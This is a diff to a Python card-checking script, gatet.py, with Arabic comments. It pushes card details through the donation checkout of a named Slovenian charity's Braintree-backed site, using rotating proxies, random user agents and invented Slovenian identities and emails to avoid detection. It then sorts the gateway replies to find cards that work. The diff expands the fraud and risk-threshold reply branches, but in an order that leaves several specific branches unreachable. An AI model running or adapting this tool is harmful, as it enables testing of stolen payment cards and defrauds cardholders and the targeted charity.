@@ -1,4 +1,4 @@
-# ==================== gatet.py (النسخة النهائية - تم إضافة ردود Fraud و Risk Threshold) ====================
+# ==================== gatet.py (النسخة النهائية - تم تعديل ردود الفراود بدقة) ====================
 
 import requests, json, re, random, sys, os, time, base64, uuid
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -58,9 +58,8 @@ def extract_reason(text):
     return None
 
 def generate_valid_email():
-    """توليد إيميل صالح بنطاقات مختلفة (لا تستخدم Gmail فقط للمواقع السلوفينية)"""
+    """توليد إيميل صالح بنطاقات مختلفة"""
     
-    # دومينات بريدية مقبولة عالمياً
     domains = [
         'gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com',
         'icloud.com', 'protonmail.com', 'mail.com', 'yandex.com',
@@ -68,7 +67,6 @@ def generate_valid_email():
         'centrum.cz', 'quick.cz', 'tiscali.cz', 'iol.cz'
     ]
     
-    # أسماء عشوائية
     names = [
         'janez', 'marija', 'marko', 'ana', 'peter', 'iva', 'miha', 'nina', 'tomaz', 'eva',
         'janko', 'metka', 'rok', 'urska', 'luka', 'tilen', 'zala', 'neza', 'blaz', 'katja',
@@ -76,13 +74,11 @@ def generate_valid_email():
         'ivan', 'helena', 'andrej', 'mojca', 'david', 'petra', 'gregor', 'teja', 'boris', 'julia'
     ]
     
-    # توليد إيميل بطول مناسب
     name1 = random.choice(names)
     name2 = random.choice(names)
     number = random.randint(1, 9999)
     domain = random.choice(domains)
     
-    # صيغ مختلفة للإيميل لتجنب التكرار
     formats = [
         f"{name1}.{name2}{number}@{domain}",
         f"{name1}{number}@{domain}",
@@ -122,7 +118,6 @@ def generate_realistic_si_data():
     house_number = random.randint(1, 150)
     full_address = f"{street} {house_number}"
     
-    # استخدام الإيميل الجديد الصالح
     email = generate_valid_email()
     
     companies = ['Mercator', 'Lidl', 'Hofer', 'Spar', 'Petrol', 'NLB', 'Telekom Slovenije']
@@ -148,12 +143,10 @@ def ch(ccx):
     if len(yy) == 2:
         yy = '20' + yy
     
-    # محاولة مع بروكسيات مختلفة (حد أقصى 3 محاولات)
     max_retries = 3
     last_error = None
     
     for attempt in range(max_retries):
-        # اختيار بروكسي عشوائي
         proxy = get_random_proxy()
         proxy_ip = proxy['http'].split('@')[-1].split(':')[0] if '@' in proxy['http'] else 'unknown'
         user = generate_user_agent()
@@ -161,7 +154,6 @@ def ch(ccx):
         session_id = str(uuid.uuid4())
         correlation_id = str(uuid.uuid4())[:24]
         
-        # إنشاء جلسة مع البروكسي
         r = requests.session()
         r.proxies = proxy
         r.verify = False
@@ -169,7 +161,6 @@ def ch(ccx):
         print(f"[*] Attempt {attempt+1}/{max_retries} - Using proxy: {proxy_ip}")
         print(f"[*] Email used: {fake_data['email']}")
         
-        # ================ بيانات الموقع ================
         SITE_URL = 'https://www.cujecnost.org'
         PRODUCT_URL = 'https://www.cujecnost.org/izdelek/donacija/'
         CHECKOUT_URL = 'https://www.cujecnost.org/blagajna/'
@@ -374,7 +365,7 @@ def ch(ccx):
             
             print(f"[DEBUG] Clean response: {search_text[:300]}")
             
-            # ==================== ردود Braintree الكاملة ====================
+            # ==================== ردود Braintree الكاملة المفصلة ====================
             
             # 1. نجاح
             if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
@@ -392,90 +383,108 @@ def ch(ccx):
             if 'expired card' in search_text or 'expired_card' in search_text:
                 return 'EXPIRED CARD'
             
-            # 5. احتيال (Fraud) - تم توسيعه
-            if ('fraud' in search_text or 'suspected fraud' in search_text or 
-                'gateway rejected: fraud' in search_text or 'gateway rejected: risk threshold' in search_text or
-                'processor declined - fraud' in search_text or 'processor declined - risk threshold' in search_text):
-                return 'SUSPECTED FRAUD'
+            # 5. Processor Declined - Fraud Suspected (اللي ظهر في الصورة)
+            if 'processor declined - fraud suspected' in search_text:
+                return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
             
-            # 6. Risk Threshold - منفصل أحياناً
-            if 'risk threshold' in search_text or 'risk_threshold' in search_text or 'risk score' in search_text:
-                return 'RISK THRESHOLD EXCEEDED'
+            # 6. احتيال (كل حالات الفراود)
+            if 'fraud' in search_text or 'fraud suspect' in search_text:
+                return 'FRAUD'
             
-            # 7. Do Not Honor
+            # 7. Gateway Rejected: Fraud
+            if 'gateway rejected: fraud' in search_text:
+                return 'GATEWAY REJECTED - FRAUD'
+            
+            # 8. Gateway Rejected: Risk Threshold
+            if 'gateway rejected: risk threshold' in search_text:
+                return 'GATEWAY REJECTED - RISK THRESHOLD'
+            
+            # 9. Processor Declined - Fraud
+            if 'processor declined - fraud' in search_text:
+                return 'PROCESSOR DECLINED - FRAUD'
+            
+            # 10. Processor Declined - Risk Threshold
+            if 'processor declined - risk threshold' in search_text:
+                return 'PROCESSOR DECLINED - RISK THRESHOLD'
+            
+            # 11. Risk Threshold (عام)
+            if 'risk_threshold' in search_text:
+                return 'RISK THRESHOLD'
+            
+            # 12. Processor Declined (عام)
+            if 'processor declined' in search_text:
+                return 'PROCESSOR DECLINED'
+            
+            # 13. Do Not Honor
             if 'do not honor' in search_text or 'do_not_honor' in search_text:
                 return 'DO NOT HONOR'
             
-            # 8. Closed Card
+            # 14. Closed Card
             if 'closed card' in search_text or 'card closed' in search_text:
                 return 'CLOSED CARD'
             
-            # 9. Call Issuer - Pickup Card
+            # 15. Call Issuer - Pickup Card
             if 'call issuer' in search_text or 'pick up card' in search_text or 'pickup card' in search_text:
                 return 'CALL ISSUER - PICKUP CARD'
             
-            # 10. 3D Secure
+            # 16. 3D Secure
             if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text:
                 return '3D SECURE REQUIRED'
             
-            # 11. Limit Exceeded
+            # 17. Limit Exceeded
             if 'limit exceeded' in search_text or 'exceeds limit' in search_text:
                 return 'LIMIT EXCEEDED'
             
-            # 12. Lost/Stolen
+            # 18. Lost/Stolen
             if 'lost or stolen' in search_text or 'stolen card' in search_text:
                 return 'LOST/STOLEN CARD'
             
-            # 13. Address Mismatch (AVS)
+            # 19. Address Mismatch
             if 'address verification' in search_text or 'avs' in search_text or 'postal code mismatch' in search_text:
                 return 'ADDRESS MISMATCH'
             
-            # 14. Processor Declined
-            if 'processor declined' in search_text or 'processor_declined' in search_text:
-                return 'PROCESSOR DECLINED'
-            
-            # 15. Invalid Card
+            # 20. Invalid Card
             if 'invalid card' in search_text or 'card number invalid' in search_text:
                 return 'INVALID CARD'
             
-            # 16. Cannot authorize (Policy)
+            # 21. Cannot Authorize (Policy)
             if 'cannot authorize' in search_text or 'not authorized at this time' in search_text:
                 return 'CANNOT AUTHORIZE (POLICY)'
             
-            # 17. Transaction not allowed
+            # 22. Transaction Not Allowed
             if 'transaction not allowed' in search_text:
                 return 'TRANSACTION NOT ALLOWED'
             
-            # 18. CleanTalk suspect
+            # 23. CleanTalk Suspect
             if 'cleantalk' in search_text or 'antispam' in search_text or 'ct_bot_detector' in search_text:
                 return 'CLEANTALK SUSPECT'
             
-            # 19. Card not activated
+            # 24. Card Not Activated
             if 'card not activated' in search_text:
                 return 'CARD NOT ACTIVATED'
             
-            # 20. No Account
+            # 25. No Account
             if 'no account' in search_text or 'no_account' in search_text or 'account not found' in search_text:
                 return 'NO ACCOUNT'
             
-            # 21. Card Restricted
+            # 26. Card Restricted
             if 'card restricted' in search_text or 'restricted card' in search_text:
                 return 'CARD RESTRICTED'
             
-            # 22. Invalid Email
+            # 27. رسالة البريد الإلكتروني غير الصالح
             if 'veljaven' in search_text or 'e-poštni' in search_text or 'elektronski naslov' in search_text:
                 print(f"[!] Email {billing_email} rejected, will retry with different email")
                 continue
             
-            # 23. Generic decline
+            # 28. Generic Decline
             if 'declined' in search_text:
                 return 'DECLINED'
             
-            # 24. سبب واضح من الـ Reason
+            # 29. سبب واضح من الـ Reason
             if reason and len(reason) < 60:
                 return reason.upper()
             
-            # 25. رسالة واضحة من الصفحة
+            # 30. رسالة واضحة من الصفحة
             if clean_messages and len(clean_messages) < 100:
                 return clean_messages.title()
             
